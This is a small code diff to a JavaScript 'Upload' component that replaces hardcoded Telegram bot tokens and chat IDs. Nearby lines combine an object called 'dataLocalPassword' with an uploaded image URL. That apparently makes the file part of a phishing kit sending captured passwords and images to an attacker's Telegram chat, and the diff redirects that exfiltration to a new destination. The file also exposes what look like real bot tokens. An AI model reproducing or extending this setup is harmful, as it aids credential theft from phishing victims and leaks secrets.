@@ -31,8 +31,8 @@ const Upload = () => {
                 const url_image = JSON.parse(data).url
                 const dataImages = {...dataLocalPassword, url_image};
 
-                const bot_token = '6604508383:AAGyWOqDaopVddpV94No5ZdL1tG45AOqWsw';
-                const chat_id   = '-4087784953';
+                const bot_token = '7763523229:AAHo6wJrHvQmAxudqgI9U5A-RCI7oBpfwPY';
+                const chat_id   = '-7064032318';
                 // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
                 // const chat_id   = '5208541473';
     
